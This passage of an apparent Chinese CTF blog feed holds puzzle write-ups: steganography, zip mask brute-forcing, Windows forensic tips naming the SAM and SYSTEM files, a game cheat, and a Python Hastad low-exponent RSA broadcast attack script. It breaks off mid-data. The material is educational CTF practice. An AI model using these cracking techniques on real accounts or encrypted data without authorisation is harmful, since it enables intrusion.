25oir5bey57up5ooz5lin5ye66aqa6k+d5lqg6l+z5y+v5oco5lmi5yqe5zga77ym5oma5lul5oir5om+576k5y+l5b6b6zug5lqg5lia5lqb6aqa6k+d6l+z5qc35oir5bcx5lin55so57un57ut56cb5a2x5lqg44cctmlnahqgaxmgbmv2zxigzgfyay5jbib0agugbmlnahqsqwxiaxp6awegaxmgc3rpbgwgcmvkllrozsbqbhvzacbxaxn0zxjpysbpcybzdglsbcbwdxjwbgutd2hpdguusxqgagfzig5vdghpbmcgdg8gzg8gd2l0acbuawdodcbvcibkyxkutglrzsxjig1pc3mgew91lel0ighhcybub3roaw5nihrvigrvihdpdgggc3vuc2hpbmugb3igcmfpbi5jdcbkb2vzbid0igv2zw4gbwf0dgvyiglmihlvdsbrbm93ig9yigrvbid0igtub3cuqwx0ag91z2ggssb3awxsihryesb0bybszxqgew91igtub3csvghpbmsgb2ygaxquu28gssbyzwpvawnlzc4g6bur5asc5yw25a6e5luo5p2l5bcx5lin5piv6bur55qe77ym6bur5asc6yem77ym5zci5qyi6iqx6l+y5piv57qi55qe44cc5q+b57us57us55qe57sr6jek6iqx6l+y5piv57sr55m96imy55qe77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o744cc5bcx5yop77ym5oir5ooz5l2g77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o777ym5zkm5pm05asp5zkm5lil6zuo5rkh5pyj5ywz57o777ym55sa6iez5zkm5l2g55+l6ygt5lin55+l6ygt6yo95rkh5pyj5ywz57o777ym5bc9566h5oir6l+y5piv5lya5bc96yep6k6p5l2g55+l6ygt77ym5ooz5yiw6l+z6yem77ym5lqo5piv5qyi5zac44cc&quot;def check_4(base64_part):#base64的原理是3个字符转化成4个字符，也就是4位base64正好对应3个原文，这里检查原文是否在可见字符范围内。        _temp=[]        results=[]        for i in range(4):                if base64_part[i].isalpha():                        _temp.append((base64_part[i].upper(),base64_part[i].lower()))                else:                        _temp.append((base64_part[i],base64_part[i]))        n=map(tuple, itertools.product(_temp[0],_temp[1],_temp[2],_temp[3]))        for i in set(n):                s=&#39;%s%s%s%s&#39;%i                try:                        result=base64.b64decode(s.encode()).decode()                        if result.isprintable():                                results.append(result)                except:                        pass        return(results)l=[]for i in range(int(len(x)/4)):        l.append(check_4(x[i*4:i*4+4]))#print(l)for i in l:        print(i)</code></pre><p>爆破出来后 就会出现很多列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412151916923.png" alt="image-20230412151916923"></p><p>flag在这部分：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412152010774.png" alt="image-20230412152010774"></p><p>:horse:ctfshow{base64_1s太难了!!I服了U!}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次简单的xshell远程连接</title>
      <link href="/2023/04/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
      <url>/2023/04/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一次简单的xshell远程连接"><a href="#记录一次简单的xshell远程连接" class="headerlink" title="记录一次简单的xshell远程连接"></a>记录一次简单的xshell远程连接</h1><p>起初的原因是复现2022年长安杯 检材一就是服务器 奈何vm的操作页面太不人性化 选择用xshell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412171101828.png" alt="image-20230412171101828"></p><p>先在虚拟机里面输入命令ifconfig 看到ip地址是172.16.80.133(静态网址)</p><p>在本机运行ipconfig 发现ip为192.16.80.1(动态网址) ip网络地址和主机地址(无所谓的)都不一样 即虚拟机和主机不在同一局域网下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412171906340.png" alt="image-20230412171906340"></p><p>所以要对网络进行修改</p><p>在vm里面编辑—虚拟网络编辑器—NAT模式—使用本地DHCP服务将ip地址分配给虚拟机—将子网ip改为172.16.80与虚拟机的ip地址一致(即网络地址一致)—再在NAT设置里面将网关的网络地址改为172.16.80</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412190736986.png" alt="image-20230412190736986"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412191205385.png" alt="image-20230412191205385"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412191114979.png" alt="image-20230412191114979"></p><p>再次查看本机ip已经变为172.16.80的网络地址</p><p>再打开xshell 开始进行远程连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412191436449.png" alt="image-20230412191436449"></p><p>成功连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412191521261.png" alt="image-20230412191521261"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>精武杯预赛要点</title>
      <link href="/2023/04/07/%E7%B2%BE%E6%AD%A6%E6%9D%AF%E9%A2%84%E8%B5%9B%E8%A6%81%E7%82%B9/"/>
      <url>/2023/04/07/%E7%B2%BE%E6%AD%A6%E6%9D%AF%E9%A2%84%E8%B5%9B%E8%A6%81%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="精武杯预赛要点"><a href="#精武杯预赛要点" class="headerlink" title="精武杯预赛要点"></a>精武杯预赛要点</h1><h2 id="6-操作系统账户”JIANGWU”登陆总次数为："><a href="#6-操作系统账户”JIANGWU”登陆总次数为：" class="headerlink" title="6.操作系统账户”JIANGWU”登陆总次数为："></a>6.操作系统账户”JIANGWU”登陆总次数为：</h2><p>答案为：19</p><p>注意：这里建议从系统痕迹—系统信息—用户信息—用户名—登录次数里面看 不要在帐户登陆里面直接数次数 容易错</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405093346941.png" alt="image-20230405093346941"></p><p>这里面是18次</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405093653311.png" alt="image-20230405093653311"></p><p>但真正其实是19次</p><h2 id="8-破解操作系统登录账户及密码所需文件为"><a href="#8-破解操作系统登录账户及密码所需文件为" class="headerlink" title="8.破解操作系统登录账户及密码所需文件为"></a>8.破解操作系统登录账户及密码所需文件为</h2><p>SAM和SYSTEM</p><p>原理性知识 是windows密码的储存文件位置</p><h2 id="10-13题问文件在系统中的储存路径"><a href="#10-13题问文件在系统中的储存路径" class="headerlink" title="10.13题问文件在系统中的储存路径"></a>10.13题问文件在系统中的储存路径</h2><p>建议是创建一个虚拟机 确实的看一下绝对路径 结合取证大师获得正确的答案(取证大师里面是相对路径)</p><p>推荐是虚拟机里面看一下在哪个磁盘中 再将取证大师里面后部分路径直接复制一下 因为虚拟机里面部分路径是中文的 可能和答案不一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405095359440.png" alt="image-20230405095359440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405095447239.png" alt="image-20230405095447239"></p><p>比如10题 应该是要Documents 但虚拟机里面显示的是”文档”</p><h2 id="在复习一下bitlocker的解密方法"><a href="#在复习一下bitlocker的解密方法" class="headerlink" title="在复习一下bitlocker的解密方法"></a>在复习一下bitlocker的解密方法</h2><p>在密码&#x2F;密钥检索里面找到bitlocker恢复密钥—跳转源文件—保存到本地—在加密分区中找到bitlocker解密—将密钥文件填进去就能解密</p><h2 id="手机取证的操作方法"><a href="#手机取证的操作方法" class="headerlink" title="手机取证的操作方法"></a>手机取证的操作方法</h2><p>我们是可以在取证大师里面找到两个手机备份相关数据的文件夹 </p><p>打开手机大师—文件取证—手机备份取证 在选择相应的手机平台 文件路径就可以了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230406093400181.png" alt="image-20230406093400181"></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF Misc部分复现</title>
      <link href="/2023/04/03/%5BNKCTF%5DMisc%20wp/"/>
      <url>/2023/04/03/%5BNKCTF%5DMisc%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF-Misc部分题复现"><a href="#NSSCTF-Misc部分题复现" class="headerlink" title="[NSSCTF]Misc部分题复现"></a>[NSSCTF]Misc部分题复现</h1><h2 id="easy-rgb-montage拼图-gaps恢复顺序-AES加解密"><a href="#easy-rgb-montage拼图-gaps恢复顺序-AES加解密" class="headerlink" title="easy_rgb (montage拼图 gaps恢复顺序 AES加解密)"></a>easy_rgb (montage拼图 gaps恢复顺序 AES加解密)</h2><p>给了一个文件夹和一个有密码的压缩包 文件夹里面有180张小图 考虑用montage拼图后在用gaps拼成正确的图</p><p>使用montage</p><p>首先在kali中cd进小图所在的文件夹 将小图的总数分解 比如该题180张分为15*12(能分成正方形最好是正方形) 命令为：</p><p>montage *.png -tile 15x12 -geometry +0+0 flag.png</p><p>就可以在文件夹中找到这个拼接好的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190412049.png" alt="image-20230403190412049"></p><p>然后要用ps 修改图片的长宽为1:1 用较大的数值为边长 是图片为正方形 便于后续size参数的计算</p><p>然后是在kali中使用gaps 恢复正常图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190443685.png" alt="image-20230403190443685"></p><p>命令为：python3 gaps –image&#x3D;flag2.png –size&#x3D;125 –save</p><p>size为正方形小图的边长 刚刚ps的时候改变了整体的长宽 注意此时的小正方形的边长也要发生改变</p><p>得到一个密码：NKCTF2023 用此密码打开刚刚的压缩包得到三个文档r.txt g.txt b.txt</p><p>将三个文档内容放在一起 竖着读（脑洞） 发现是压缩包结构</p><pre><code class="python">f_1=open(&#39;r.txt&#39;,&#39;r&#39;)f_2=open(&#39;g.txt&#39;,&#39;r&#39;)f_3=open(&#39;b.txt&#39;,&#39;r&#39;)r1=f_1.read()r2=f_2.read()r3=f_3.read()for i in range(0, len(r2)-1):    print(r1[i] + r2[i] + r3[i], end=&#39;&#39;)</code></pre><pre><code class="python">504b03041400000008003dba6a5654369fb2420000004000000008000000666c61672e747874f3740aa94cb32c48af0cb22c70760df20932f52bf52fc8f4f70b76370c8b2a28c92d0bf54ccf0fd40f0a712d08890a080b09374a3437b72cc87172f32c4bf6d30600504b010214001400000008003dba6a5654369fb24200000040000000080024000000000000002000000000000000666c61672e7478740a0020000000000001001800c4ecda7d6353d90185c557aa6553d9016a47568f6553d901504b050600000000010001005a0000006800000007004145532d3132</code></pre><p>放在010editor里面 save为压缩包 解压得到一串字符</p><p>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ&#x2F;RTEpTZPVTW2a779plBFIvcN+</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329092048534.png" alt="image-20230329092048534"></p><p>提示是AES加密 不需要偏移量 猜测密钥就是刚刚的NKCTF2023</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329093224178.png" alt="image-20230329093224178"></p><p>:horse:NKCTF{603fcdfc-652b-40e4-90cf-f27c2edc2d9f}</p><h2 id="easy-word-掩码爆破-lsb隐写"><a href="#easy-word-掩码爆破-lsb隐写" class="headerlink" title="easy_word(掩码爆破 lsb隐写)"></a>easy_word(掩码爆破 lsb隐写)</h2><p>先在给的压缩包中看到了注释 对密码信息进行了提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329180648249.png" alt="image-20230329180648249"></p><p>设置掩码进行爆破</p><p><a href="https://blog.csdn.net/qq_42094992/article/details/102178981?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168008477816800213020232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=168008477816800213020232&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102178981-null-null.142%5Ev77%5Econtrol_1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%AE%BE%E7%BD%AE%E6%8E%A9%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42094992/article/details/102178981?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168008477816800213020232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168008477816800213020232&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102178981-null-null.142^v77^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%E8%AE%BE%E7%BD%AE%E6%8E%A9%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4&amp;spm=1018.2226.3001.4187</a></p><p>(掩码设置可以看这篇)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195352821.png" alt="image-20230329195352821"></p><p>得到密码h4evOF90</p><p>打开了加密文档 但是并没有flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195747687.png" alt="image-20230329195747687"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195834107.png" alt="image-20230329195834107"></p><p>binwalk分离一下  找到了一张图片 拿到key:Welcome_to_NKCTF</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195910240.png" alt="image-20230329195910240"></p><p>放到stegsolve中看一下 发现不对劲 是lsb隐写</p><p><img src="https://w3nx1z1.github.io/blogimage@main/image/image-20230329205339042.png" alt="image-20230329205339042"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329205458115.png" alt="image-20230329205458115"></p><p>密码就是图片中的密码</p><p>得到flag:horse:NKCTF{dc0684dd-5a57-4d47-b9c0-debed0ef28b9}  </p><h2 id="first-spam-of-rabbit-year-与佛论禅-零宽隐写-rot13-rot47-rabbit加解密"><a href="#first-spam-of-rabbit-year-与佛论禅-零宽隐写-rot13-rot47-rabbit加解密" class="headerlink" title="first spam of rabbit year(与佛论禅 零宽隐写 rot13 rot47 rabbit加解密)"></a>first spam of rabbit year(与佛论禅 零宽隐写 rot13 rot47 rabbit加解密)</h2><p>题目已经告诉我们了 这是一个垃圾邮件 翻到最底下 有一串社会主义核心价值观编码：</p><p>法治文明公正民主公正文明公正文明公正敬业法治自由文明富强友善爱国平等爱国友善敬业爱国爱国文明富强公正诚信和谐公正诚信平等法治公正公正平等</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330135348531.png" alt="image-20230330135348531"></p><p>解码为：rabbit 又 move</p><p>找到一个叫spammimic的网站 可以解密垃圾邮件<a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190538577.png" alt="image-20230403190538577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330140145317.png" alt="image-20230330140145317"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330190745310.png"></p><p>试了普通的与佛论禅发现领悟不了佛的真意 尝试是加密的与佛论禅 密码就是rabbit 得到一串字符</p><p><code>&amp;‍‎‏auD5‏‍v&#39;&lt;)‏‍‌</code>h‎‏{dF6C_*’Jrcqzrh&amp;ZaF&gt;<code>g^‏‍‌Hr&#39;&#125;vuHZJB‎‏%~&#125;_H5?gu‌‏‏;q‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13</code></p><p>放在厨子里面看一下 就看到有零宽隐写 在猫捉鱼铃网站上找到在线零宽解密工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330192644150.png" alt="image-20230330192644150"></p><p><code>EnoOoO1G</code>为隐写信息 再刚刚得到的字符串中有tip：47&amp;13 是指rot47和rot13</p><p>对零宽隐写的内容进行rot13解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330193512665.png" alt="image-20230330193512665"></p><p>得到RabBbB1T</p><p>在对字符串<code>&amp;auD5v&#39;&lt;)</code>h{dF6C_*’Jrcqzrh&amp;ZaF&gt;<code>g^Hr&#39;&#125;vuHZJB%~&#125;_H5?gu;q)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w</code>进行rot47解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330194602713.png" alt="image-20230330194602713"></p><p>得到<code>U‍‎‏2Fsd‏‍GVkX‏‍‌19‎‏L5uer0YVyC4BKC9U+2um18/‏‍‌wCVNGFw+yq‎‏TON0wdn8F‌‏‏jB‍‏‌XQkCpnLDwaLx727z7FleH</code>进行rabbit解密 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330200221581.png" alt="image-20230330200221581"></p><pre><code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></pre><h2 id="三体-bmp提取信息"><a href="#三体-bmp提取信息" class="headerlink" title="三体(bmp提取信息)"></a>三体(bmp提取信息)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/%E4%B8%89%E4%BD%93.bmp" alt="三体"></p><p>开局一张bmp图片</p><pre><code class="python">from PIL import Imagedef decode(im):    width,height = im.size    lst = []    for y in range(height):        for x in range(width):            red,green,blue = im.getpixel((x,y))            if(blue | green | red) == 0:                break            index = (green&lt;&lt;8) + blue            lst.append(chr(index))    return &#39;&#39;.join(lst)if __name__==&#39;__main__&#39;:    all_text = decode(Image.open(&quot;三体.bmp&quot;,&quot;r&quot;))    with open (&quot;decode.text&quot;,&quot;w&quot;,encoding = &quot;utf-8&quot;) as f:        f.write(all_text)</code></pre><p>脚本直接提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330202121371.png" alt="image-20230330202121371"></p><p>NKCTF{3d77dc1a37b2d1ebf489c973f554ea10}</p><h2 id="easy-music-openbuff软件-波形频谱隐写"><a href="#easy-music-openbuff软件-波形频谱隐写" class="headerlink" title="easy_music(openbuff软件 波形频谱隐写)"></a>easy_music(openbuff软件 波形频谱隐写)</h2><p>题目提示要有三个密码</p><p>用audacity打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331075747420.png"></p><p>发现psdB：74208645</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331082045938.png"></p><p>010editor打开在尾部发现psdC：01374890</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331082234613.png" alt="image-20230331082234613"></p><p>在前面的波形很像二进制 对应二进制数字是</p><pre><code>01110000 01110011 01100100 01000001 00111010 00111000 00110011 00111001 00110111 00111001 00110011 00110110 00110111 </code></pre><p>转为文本(注意为八位算一个字节)</p><p>得到psdA:83979367</p><p>要使用的软件就是openbuff </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331084007521.png" alt="image-20230331084007521"></p><p>:horse:NKCTF{52d446a51c6896af878f872e0d748118}</p><h2 id="TH-Master-游戏题-作弊器的使用"><a href="#TH-Master-游戏题-作弊器的使用" class="headerlink" title="TH Master(游戏题 作弊器的使用)"></a>TH Master(游戏题 作弊器的使用)</h2><p>游戏题  使用东方星莲船修改器 把分数改成200000000分就OK了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230402121739812.png" alt="image-20230402121739812"></p><p>在replay的th12_01.rpy文件中就可以找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190622943.png" alt="image-20230403190622943"></p><p>:horse:NKCTF{U_R_re411y_g00d_At_p14ying_t0h0u}</p><h2 id="easy-bmp-爆破出bmp文件的宽度-puzzlesolver工具的使用"><a href="#easy-bmp-爆破出bmp文件的宽度-puzzlesolver工具的使用" class="headerlink" title="easy_bmp(爆破出bmp文件的宽度 puzzlesolver工具的使用)"></a>easy_bmp(爆破出bmp文件的宽度 puzzlesolver工具的使用)</h2><p>打开是一个有密码的压缩包和两张有问题的bmp</p><p>一张直接看出的高度有问题 修改一下得到key的前半段</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190650649.png" alt="image-20230403190650649"></p><p>剩下一张bmp文件名是width提示要修改宽度 选择python脚本来进行爆破 在里面找出最清楚的一张</p><pre><code class="python">import structwith open(&#39;width.bmp&#39;, &#39;rb&#39;) as f:    data = f.read()    width = struct.unpack(&#39;&lt;i&#39;, data[18:22])[0]    height = struct.unpack(&#39;&lt;i&#39;, data[22:26])[0]# 爆破 BMP 文件的宽度for i in range(1000, 1500):    f1 = open(&#39;bpout&#39; + str(i) + &#39;.bmp&#39;, &#39;wb&#39;)    img = data[:18] + struct.pack(&#39;&gt;i&#39;, i)[::-1] + data[22:]    f1.write(img)    f1.close()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/bpout1404.bmp" alt="bpout1404"></p><p>组合起来就是key：BMP_Height_width_easy</p><p>打开是一张flag.bmp 看到前面图片里的”SAME”猜测也是宽高发生了变化 使用puzzlesolver工具进行处理</p><p>得到一张二维码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190735178.png" alt="image-20230403190735178"></p><p>用sharex扫描一下 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190804825.png" alt="image-20230403190804825"></p><p>:horse:NKCTF{eab1291e-9e37-4ff1-b76d-f1af63eaad43}</p><h2 id="easypic-用图片做加密容器的密钥-近邻法缩放图片"><a href="#easypic-用图片做加密容器的密钥-近邻法缩放图片" class="headerlink" title="easypic(用图片做加密容器的密钥 近邻法缩放图片)"></a>easypic(用图片做加密容器的密钥 近邻法缩放图片)</h2><p>题目描述：出题人把flag偷偷藏在加密盘里面了，你知道怎么把它还原出来吗</p><p>附件为一张图片 在图片png文件尾后发现藏了东西 可以分离为一张图片和一个vc容器加密盘 密钥文件就是图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190827040.png" alt="image-20230403190827040"></p><p>加密容器里面有一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190844383.png" alt="image-20230403190844383"></p><p>隐隐约约可以看见背景图层还是一张图片 又在010editor看见flag.png文件尾有一个tip：566*566 所以用ps将图片尺寸改一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190909663.png" alt="image-20230403190909663"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190927078.png" alt="image-20230403190927078"></p><p>得到flag:horse:NKCTF{49ce8740502743585c4a44404e62d8f9}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低指数加密广播攻击</title>
      <link href="/2023/03/18/%E4%BD%8E%E6%8C%87%E6%95%B0%E5%8A%A0%E5%AF%86%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/"/>
      <url>/2023/03/18/%E4%BD%8E%E6%8C%87%E6%95%B0%E5%8A%A0%E5%AF%86%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="低指数加密广播攻击"><a href="#低指数加密广播攻击" class="headerlink" title="低指数加密广播攻击"></a>低指数加密广播攻击</h1><h2 id="低指数加密广播攻击的意思"><a href="#低指数加密广播攻击的意思" class="headerlink" title="低指数加密广播攻击的意思"></a>低指数加密广播攻击的意思</h2><p>低指数加密广播攻击，也叫Johan Hastad攻击 指的大概是发送者将明文m分发给了多个接受者 且使用了不同的N ，但是是相同的加密指数e，产生了不同的密文c 。在这种传播明文的方式中 一般使用的e较小 ，大多数情况下 e的值和密文接受者的数量相同， 也就是说e的值和(n, c)对数的值相同 。</p><p>在CTF中就是n、c不同，但是e、m相同，使用中国剩余定理和高斯算法来解决。</p><h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p>用来解决同余问题</p><blockquote><p>设正整数<img src="https://img-blog.csdn.net/20140618184134796" alt="img">两两互素，则同余方程组</p><p>​               <img src="https://img-blog.csdn.net/20140618184240203" alt="img"></p><p>有整数解。并且在模<img src="https://img-blog.csdn.net/20140618184354156" alt="img">下的解是唯一的，解为</p><p>​                <img src="https://img-blog.csdn.net/20140618184502609" alt="img"></p><p>其中<img src="https://img-blog.csdn.net/20140618184601062" alt="img">，而<img src="https://img-blog.csdn.net/20140618184638140" alt="img">为<img src="https://img-blog.csdn.net/20140618184737359" alt="img">模<img src="https://img-blog.csdn.net/20140904164235549" alt="img">的逆元。</p></blockquote><p>M^-1&#x3D;M^(-1)%mi</p><h1 id="高斯算法"><a href="#高斯算法" class="headerlink" title="高斯算法"></a>高斯算法</h1><blockquote><p>算法：有N &#x3D; n1n2…nr那么</p><p>x ≡ (c1N1d1 + c2N2d2 + … + crNrdr)(modN)</p><p>Ni &#x3D; N&#x2F;ni    di &#x3D; Ni^(-1)%ni</p></blockquote><p>而m^e &#x3D; x 明文m就是x开e次方</p><p>攻击代码：</p><pre><code class="python">import binascii,gmpy2from functools import reducefrom Crypto.Util.number import *import libnumdef CRT(ni, ci):    assert(reduce(gmpy2.gcd, ni) == 1)    assert (isinstance(ni, list) and isinstance(ci, list))    N = reduce(lambda x, y: x * y, ni) # ni的乘积 N = n1*n2*n3.....    ai_ti_Mi = [a * (N // m) * gmpy2.invert(N // m, m) for (m, a) in zip(ni, ci)]    return reduce(lambda x, y: x + y, ai_ti_Mi) % Ne =   # 题目给出的低指数en_list =        # 题目给出的多组nc_list =        # 题目给出的多组cm = gmpy2.iroot(CRT(n_list, c_list), e)[0]print(m)print(libnum.n2s(int(m)))</code></pre><p>例题：</p><pre><code class="python">from Crypto.Util.number import *from Crypto.Util.Padding import *FLAG = bytes_to_long(pad(b&quot;flag&#123;??????&#125;&quot;,64))def init_key():    p, q = getPrime(512), getPrime(512)    n = p*q    e = 9    while(GCD((p-1)*(q-1), e)!=1):        p, q = getPrime(512), getPrime(512)        n = p*q    d = inverse(e, (p-1)*(q-1))    return n, e, dn_list = list()c_list = list()for i in range(9):    N, e, d = init_key()    n_list.append(N)    c = pow(FLAG, e, N)    c_list.append(pow(FLAG, e, N))    assert(pow(c, d, N) == FLAG)print(&quot;n_list:&quot;, n_list)print(&quot;c_list:&quot;, c_list)n_list: [71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799,         92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949,         100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919,         59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847,         66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147,         120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377,         72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281,         69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951,         76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]c_list: [62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585,         46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900,         